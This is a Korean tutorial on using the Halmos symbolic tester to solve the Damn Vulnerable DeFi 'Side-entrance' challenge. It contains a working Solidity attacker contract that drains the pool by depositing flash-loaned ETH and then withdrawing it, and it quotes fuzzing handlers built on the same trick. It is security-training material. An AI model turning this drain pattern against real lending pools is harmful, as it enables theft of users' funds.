# Halmos vs Side-entrance

## Halmos 버전
이 글에서는 halmos 0.2.2.dev1+gd4cac2e 버전이 사용되었습니다.

## 서문
독자는 다음의 이전 글들에 익숙하다고 강력하게 가정합니다:
1. [Unstoppable](https://github.com/Burnnnnny/damn-vulnerable-defi-halmos/tree/master/test/unstoppable) 
2. [Truster](https://github.com/Burnnnnny/damn-vulnerable-defi-halmos/tree/master/test/truster)
3. [Naive-receiver](https://github.com/Burnnnnny/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver)

주요 아이디어가 여기에서도 대부분 반복되므로 다시 설명하지 않습니다.

## 준비
### 공통 필수 조건
1. **SideEntrance.t.sol** 파일을 **SideEntranceHalmos.t.sol**로 복사합니다. 이 파일에서 작업할 것입니다.
2. `test_sideEntrance()`의 이름을 `check_sideEntrance()`로 변경하여 Halmos가 이 테스트를 심볼릭하게 실행하도록 합니다.
3. `makeAddr()` 치트코드 사용을 피하십시오:
    ```solidity
    address deployer = address(0xcafe0000);
    address player = address(0xcafe0001);
    address recovery = address(0xcafe0002);
    ```
4. **GlobalStorage** 계약을 생성하고 `pool` 주소-이름 쌍을 저장하십시오:
    ```solidity
    import "lib/GlobalStorage.sol";
    ...
    contract SideEntranceChallenge is Test {
        ...
        GlobalStorage glob;
        ...
        function setUp() public {
            startHoax(deployer);
            glob = new GlobalStorage();
            ...
            glob.add_addr_name_pair(address(pool), "SideEntranceLenderPool");
            vm.stopPrank();
        }
    ...
    }
    ```
5. 이슈 #338 우회
    ```solidity
    startHoax(deployer, 1 << 80);
    ```
6. 다가올 **SymbolicAttacker**를 포함하여 모든 계약 주소를 출력하십시오:
    ```solidity
    function check_sideEntrance() public checkSolvedByPlayer {
        SymbolicAttacker attacker = new SymbolicAttacker();
        console.log("GlobalStorage\t\t", address(glob));
        console.log("SideEntranceLenderPool\t", address(pool));
        console.log("SymbolicAttacker\t\t", address(attacker));
        ...
    }
    ```
    ```javascript
    $ halmos --solver-timeout-assertion 0 --function check_sideEntrance
    ...
    [console.log] GlobalStorage              0x00000000000000000000000000000000000000000000000000000000aaaa0002
    [console.log] SideEntranceLenderPool     0x00000000000000000000000000000000000000000000000000000000aaaa0003
    [console.log] SymbolicAttacker           0x00000000000000000000000000000000000000000000000000000000aaaa0004
    ```
### _isSolved() 구현
원래 확인 로직은 다음과 같습니다:
```solidity
function _isSolved() private view {
    assertEq(address(pool).balance, 0, "Pool still has ETH");
    assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
}
```
이번에는 완전히 반대되는 확인을 하지는 않을 것입니다. 대신, 이전 [Naive-receiver](https://github.com/Burnnnnny/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver#a-simplified-invariant)에서 배운 교훈을 고려하여, 먼저 어떤 버그라도 찾아볼 것입니다. 복구(recovery)에 대한 조건을 제거하고 풀을 어느 정도라도 비울 수 있는지 알아봅시다:
```solidity
function _isSolved() private view {
    assert(address(pool).balance >= ETHER_IN_POOL);
}
```
### SymbolicAttacker 구현
이번 챌린지에서는 처음으로 토큰이나 랩핑된 **ETH** (**WETH**) 대신 네이티브 **ETH** 자산을 사용하는 로직을 접하게 됩니다. 따라서 **SymbolicAttacker**가 트랜잭션에서 **ETH** 가치도 고려해야 하는 것은 당연합니다. 먼저, 플레이어의 전체 **ETH** 잔액을 **SymbolicAttacker**로 전송해 봅시다. Halmos는 가스를 계산하지 않으므로 여전히 `player`로부터 트랜잭션을 실행할 수 있습니다 :):
```solidity
function check_sideEntrance() public checkSolvedByPlayer {
    SymbolicAttacker attacker = new SymbolicAttacker();
    vm.deal(address(attacker), PLAYER_INITIAL_ETH_BALANCE);
    vm.deal(address(player), 0); // Player's ETH is transferred to attacker.
    ...
```
그리고 또 다른 중요한 추가 사항: 이제 우리는 함수 자체의 심볼릭 매개변수뿐만 아니라 **ETH**의 심볼릭 가치도 심볼릭 트랜잭션에 전달합니다:
```solidity
contract SymbolicAttacker is Test, SymTest {
    ...
    function execute_tx() private {
        uint256 ETH_val = svm.createUint256("ETH_val");
        address target = svm.createAddress("target");
        bytes memory data;
        //구체적인 target-name 쌍 얻기
        (target, data) = glob.get_concrete_from_symbolic(target);
        target.call{value: ETH_val}(data);
    }
    ...
}
```
## 커버리지 개선
익숙한 원칙에 따라 단일 심볼릭 트랜잭션으로 시작합니다. 모든 코드가 커버되는지 확인해 봅시다:
```solidity
function check_sideEntrance() public checkSolvedByPlayer {
    ...
    attacker.attack();
}
```
```solidity
contract SymbolicAttacker is Test, SymTest {
    ...
    function attack() public {
        execute_tx();
    }
```
### 콜백(Callbacks)
실행:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_sideEntrance -vvvvv
...
Path #4:
            ...
            CALL SideEntranceLenderPool::flashLoan(p_amount_uint256_a507985_05()) (value: halmos_ETH_val_uint256_4f72fbf_01)
                CALL SymbolicAttacker::execute() (value: p_amount_uint256_a507985_05)
                ↩ REVERT 0x (error: Revert())
                ...
...
[PASS] check_sideEntrance() (paths: 9, time: 0.26s, bounds: [])
```
문제가 있습니다: `SideEntranceLenderPool::flashLoan()`은 이 함수를 호출한 계약이 **SymbolicAttacker**에는 없는 지불 가능한(payable) 콜백 `execute()`를 가지고 있다고 가정합니다.
```solidity
contract SideEntranceLenderPool {
    ...
    function flashLoan(uint256 amount) external {
        ...
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
    ...
    }
```
분명히, **SymbolicAttacker** 내부에 `execute()` 함수를 구현해야 합니다. 하지만 그 안에 무엇이 있어야 할까요? 말 그대로 이 함수가 실행되는 동안 무엇이든 실행될 수 있습니다... 사실, 이것이 정답입니다 - 우리는 이것을 `attack()` 처럼 처리합니다 - 다수의 심볼릭 하위 트랜잭션이 단순히 내부에서 실행됩니다. 하나부터 시작해 보고 충분한지 봅시다.
```solidity
function execute () external payable {
    uint256 ETH_val = svm.createUint256("ETH_val_execute");
    address target = svm.createAddress("target_execute");
    bytes memory data;
    //구체적인 target-name 쌍 얻기
    (target, data) = glob.get_concrete_from_symbolic(target);
    target.call{value: ETH_val}(data);
}
```
그리고 `SideEntranceLenderPool::withdraw()`에 또 다른 문제가 있습니다:
트랜잭션 시점에 **SymbolicAttacker**가 풀 잔액을 가지고 있지 않았음에도 불구하고, Halmos는 여전히 **SymbolicAttacker**에게 심볼릭 금액의 **ETH**를 전송하려고 시도했습니다. 그리고 일어난 일은 다음과 같습니다:
```javascript
Path #2:
...
           CALL SideEntranceLenderPool::withdraw() (value: halmos_ETH_val_uint256_4f72fbf_01)
           ...
                CALL SymbolicAttacker::0x
                ↩ REVERT 0x (error: Revert())
                ...
```
우리는 `receive()` 콜백 함수가 없으므로 이 또한 구현합니다:
```solidity
receive() external payable {
    uint256 ETH_val = svm.createUint256("ETH_val_receive");
    address target = svm.createAddress("target_receive");
    bytes memory data;
    //구체적인 target-name 쌍 얻기
    (target, data) = glob.get_concrete_from_symbolic(target);
    target.call{value: ETH_val}(data);
}
```
### 재귀 방지
이제 가능한 재귀에 대해 이야기해 봅시다. 이번에는 **SymbolicAttacker**에 `execute_tx()`처럼 동작하는 2개의 콜백 함수가 있으므로 `vm.assume(...)` 패턴을 편리하게 사용할 수 없습니다. 동시에 기본 [ReentrancyGuard](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard)는 모든 함수에 공통적이므로 일부 시나리오를 차단할 수 있어 우리에게 작동하지 않을 것입니다.
그래서, 가장 간단한 **ReentrancyGuard**의 유사품을 만들어 봅시다:
```solidity
contract SymbolicAttacker is Test, SymTest {
...
    bool receive_reent_guard = false;
    bool execute_reent_guard = false;
    ...
    receive() external payable {
        if (receive_reent_guard) {
            revert();
        }
        receive_reent_guard = true;
        ...
        receive_reent_guard = false;
    }
    
    function execute () external payable {
        if (execute_reent_guard) {
            revert();
        }
        execute_reent_guard = true;
        ...
        execute_reent_guard = false;
    }
```
다시 실행:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_sideEntrance
...
[PASS] check_sideEntrance() (paths: 57, time: 1.70s, bounds: [])
...
```
완벽합니다. 완료된 경로 수가 증가했습니다. 자, 다음에 무슨 일이 일어날지 이미 짐작하실 수 있을 것입니다 :)
## 트랜잭션 늘리기
또 다른 심볼릭 공격 트랜잭션을 추가합니다:
```solidity
function attack() public {
    execute_tx();
    execute_tx();
}
```
실행:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_sideEntrance
...
Counterexample:
halmos_ETH_val_execute_uint256_c9b0694_07 = 0x000000000000000000000000000000000000000000000016bc1f3a7c229fd8e9
halmos_ETH_val_receive_uint256_4d032b7_19 = 0x000000000000000000000000000000000000000000000016c7c8b6b3a7640000
halmos_ETH_val_uint256_923f00f_01 = 0x0000000000000000000000000000000000000000000000000000000000000000
halmos_ETH_val_uint256_d146144_13 = 0x0000000000000000000000000000000000000000000000000000000000000000
halmos_selector_bytes4_2929a1b_18 = withdraw
halmos_selector_bytes4_321817f_06 = flashLoan
halmos_selector_bytes4_487ba75_12 = deposit
halmos_selector_bytes4_780a835_24 = 0x00000000
halmos_target_address_742d8e0_14 = 0x00000000000000000000000000000000aaaa0003
halmos_target_address_8fb3daf_02 = 0x00000000000000000000000000000000aaaa0003
halmos_target_execute_address_b2f1b7a_08 = 0x00000000000000000000000000000000aaaa0003
halmos_target_receive_address_d6b1aa3_20 = 0x00000000000000000000000000000000aaaa0003
p_amount_uint256_b5e253c_05 = 0x000000000000000000000000000000000000000000000016b9e8000000000000
[FAIL] check_sideEntrance() (paths: 3334, time: 102.26s, bounds: [])
```
좋습니다, 꽤 쉬웠습니다. 반례를 분석해 봅시다.
## 반례 분석
반례는 무슨 일이 일어났는지에 대한 순서를 명확하게 보여줍니다.
`SideEntranceLenderPool::flashLoan()`이 호출되었습니다. `pool`은 **SymbolicAttacker**의 `execute()` 함수를 호출했습니다. 그는 차례로 빌린 자금(및 소량의 자기 자금)을 사용하여 동일한 `pool`에 예치했습니다. FlashLoan이 끝날 때 `pool`의 잔액이 더 커졌으므로 성공적으로 종료되었습니다. 그 후, **SymbolicAttacker**는 두 번째 트랜잭션에서 `withdraw()` 함수를 사용하여 예치금에서 모든 부당한 자금을 인출했습니다.

또한 `receive()` 콜백에서 무엇이 수행되었는지 살펴봅시다:

```javascript
halmos_selector_bytes4_780a835_24 = 0x00000000
halmos_ETH_val_receive_uint256_4d032b7_19 = 0x000000000000000000000000000000000000000000000016c7c8b6b3a7640000
```
선택자 `0x00000000`은 **ETH** 전송입니다. 즉, 단순히 일정량의 **Ether**를 `pool`로 다시 보내는 것입니다. 이것은 공격에 어떤 영향도 미치지 않으므로 공격을 구성할 때 반례의 이 부분은 무시할 수 있습니다.
## 반례 사용
이제 버그와 함께 공격은 명백해집니다:
```solidity
pragma solidity =0.8.25;

import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

contract Attacker {
    uint256 constant ETHER_IN_POOL = 1000e18;
    SideEntranceLenderPool public pool;
    uint256 public amount;
    address public recovery;

    constructor (   SideEntranceLenderPool _pool, 
                    uint256 _amount, 
                    address _recovery) {
        pool = _pool;
        amount = _amount;
        recovery = _recovery;
    }

    receive() external payable {
    }

    function execute () external payable {
        pool.deposit(amount);
    }

    function attack(address recovery) public {
        pool.flashLoan(amount);
        pool.withdraw();
        SafeTransferLib.safeTransferETH(recovery, ETHER_IN_POOL);
    }
}
```
```solidity
function test_sideEntrance() public checkSolvedByPlayer {
    Attacker attacker = new Attacker(pool, 1000e18, recovery);
    attacker.attack();
}
```
실행:
```javascript
$ forge test --mp test/side-entrance/SideEntrance.t.sol
...
[PASS] test_sideEntrance() (gas: 295447)
```
또 다른 Damn Vulnerable Defi 챌린지가 해결되었습니다!
## 퍼징 vs Side-entrance
인터넷 퍼징을 통해 이 문제에 대한 몇 가지 해결책을 찾았습니다. 첫 번째는 **Team RareSkills**의 [이 기사](https://www.rareskills.io/post/invariant-testing-solidity)입니다. 하지만 이 해결책에는 문제가 있습니다: 그들은 **Foundry** 퍼저가 버그가 무엇인지, 어떻게 악용하는지 미리 "알도록" 작성된 **Handler**를 사용했습니다. 즉, 그들은 퍼저에게 너무 큰 힌트를 주었습니다:
```solidity
import {SideEntranceLenderPool} from "../../src/SideEntranceLenderPool.sol";

import "forge-std/Test.sol";

contract Handler is Test {
    // the pool contract
    SideEntranceLenderPool pool;
    
    // used to check if the handler can withdraw ether after the exploit
    bool canWithdraw;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;

        vm.deal(address(this), 10 ether);
    }
    
    // this function will be called by the pool during the flashloan
    function execute() external payable {
        pool.deposit{value: msg.value}(); // !!! 이 줄은 너무 명백한 힌트입니다
        canWithdraw = true;
    }
    
    // used for withdrawing ether balance in the pool
    function withdraw() external {
        if (canWithdraw) pool.withdraw();
    }

    // call the flashloan function of the pool, with a fuzzed amount
    function flashLoan(uint amount) external {
        pool.flashLoan(amount);
    }

    receive() external payable {}
}
```
제 생각에 그러한 **Handler**를 사용하는 것은 일종의 부정행위이며, 퍼저가 실제로 챌린지를 해결했다고 말하기에는 충분하지 않습니다.

또 다른 해결책은 **Crytic 팀**이 만든 것으로 [이 링크](https://github.com/crytic/building-secure-contracts/blob/master/program-analysis/echidna/exercises/exercise7/solution.sol)에서 찾을 수 있습니다. 여기서는 상황이 훨씬 낫습니다: 해결책은 **Echidna** 자체가 버그를 찾을 수 있는 여지를 줄 만큼 충분히 추상적입니다. 게다가 해결하는 데 몇 초밖에 걸리지 않았습니다.

**Echidna**와 **Halmos**가 "`execute()` 내부에서 어떤 함수든 실행될 수 있다"는 문제를 어떻게 처리하는지 비교해 봅시다.

Echidna:
```solidity
...
function setEnableWithdraw(bool _enabled) public {
    enableWithdraw = _enabled;
}

function setEnableDeposit(bool _enabled, uint256 _amount) public {
    enableDeposit = _enabled;
    depositAmount = _amount;
}

function execute() external payable override {
    if (enableWithdraw) {
        pool.withdraw();
    }
    if (enableDeposit) {
        pool.deposit{value: depositAmount}();
    }
}
...
```
우리는 어떤 함수가 어떤 매개변수로 호출될 수 있는지 명시적으로 나타냅니다. 분명히, 더 큰 설정이 있었다면 이 코드는 훨씬 더 "비대해졌을" 것입니다. 우리는 이미 [Truster](https://github.com/Burnnnnny/damn-vulnerable-defi-halmos/tree/master/test/truster#echidna)에서 이와 비슷한 것을 보았습니다.

이제 Halmos:
```solidity
function execute () external payable {
    ...
    uint256 ETH_val = svm.createUint256("ETH_val_execute");
    address target = svm.createAddress("target_execute");
    bytes memory data;
    (target, data) = glob.get_concrete_from_symbolic(target);
    target.call{value: ETH_val}(data);
    ...
}
```
Halmos 기반 코드가 그러한 경우에 대해 더 나은 추상화를 제공하고 설정을 확장하는 작업을 더 잘 수행한다는 것을 쉽게 알 수 있습니다.
## 결론
1. 이미 축적된 기술과 원칙을 사용하여, 우리는 Halmos로 다음 Damn Vulnerable Defi 챌린지를 매우 쉽게 해결했습니다. 모든 단계가 명확하고 자명했습니다.
2. 테스트를 특정 계약에 맞게 조정하는 것은 좋은 생각입니다. 예를 들어, 이 챌린지에서는 네이티브 **ETH**를 사용하도록 조정했습니다. 여기서 또한 주목할 가치가 있는 것은, (**ETH**를 보내고 받을 수 있는 능력을 갖춘) 이러한 "고급" **SymbolicAttacker**는 물론 이전 챌린지에도 적용될 수 있다는 것입니다. 그러나 미래에는 솔버와 반례에 부하를 주지 않기 위해 **ETH**와 관련된 챌린지에서만 이 확장을 사용할 것입니다.
3. 우리는 이전에 내린 결론을 다시 확인합니다: 작은 설정의 경우, 트랜잭션 추상화를 사용해야 하더라도 퍼징은 정말 매우 효과적인 도구인 것 같습니다. 그러나 퍼징 엔진에는 편리한 추상화 메커니즘이 없으므로, 대상 계약이 추상적 호출의 일부 로직에 연결되어 있다면 Halmos가 훨씬 더 편리하고 강력해 보입니다.
## 다음 단계는?
다음 챌린지는 [The-rewarder](https://github.com/Burnnnnny/damn-vulnerable-defi-halmos/tree/master/test/the-rewarder)입니다.
